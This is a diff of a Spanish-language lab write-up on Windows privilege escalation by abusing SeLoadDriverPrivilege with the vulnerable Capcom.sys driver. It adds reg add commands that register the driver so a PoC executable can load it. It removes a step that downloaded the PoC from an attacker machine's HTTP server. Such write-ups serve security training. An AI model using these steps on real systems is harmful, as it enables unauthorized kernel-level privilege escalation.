@@ -392,20 +392,21 @@ Observamos que esta vez el privilegio `SeLoadDriverPrivilege` aparece `Disabled`
 ---
 
 
-El siguiente paso es habilitar `SeLoadDriverPrivilege` con el archivo `EnableSeLoadDriverPrivilege.cpp` de la `PoC` que proporciona el curso.
+El siguiente paso es habilitar `SeLoadDriverPrivilege` con el archivo `EnableSeLoadDriverPrivilege.exe` de la `PoC` que proporciona el curso, el mismo además carga el driver.
+
+Podríamos compilar el `.cpp` de la `PoC` pero procecemos a utilizar el `.exe` que tenemos en la máquina víctima.
+
+Antes de ejecutar `EnableSeLoadDriverPrivilege.exe` debemos añadir referencia a `C:\Tools\Capcom.sys` en el registro:
+
+<img width="1030" height="292" alt="image" src="https://github.com/user-attachments/assets/778a3446-d341-40b6-a1f3-b784a82446a5" />
 
 
-Pasamos el archivo `EnableSeLoadDriverPrivilege.cpp` a la máquina víctima:
 
-Máquina atacante:
-```bash
-python3 -m http.server 7777
-```
-
-Desde la máquina víctima, abrimos una powershell sin elevar y realizamos el comando:
+Utilizamos los siguientes comandos:
 ```powershell
-wget "http://10.10.14.11:7777/EnableSeLoadDriverPrivilege.cpp" -outfile "EnableSeLoadDriverPrivilege.cpp"
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 ```
 
-<img width="991" height="311" alt="image" src="https://github.com/user-attachments/assets/4c5cf8df-0fac-4344-9808-db0328be400e" />
 
+<img width="986" height="117" alt="image" src="https://github.com/user-attachments/assets/854faead-dbdb-4f43-b4b6-670fc5957ec6" />
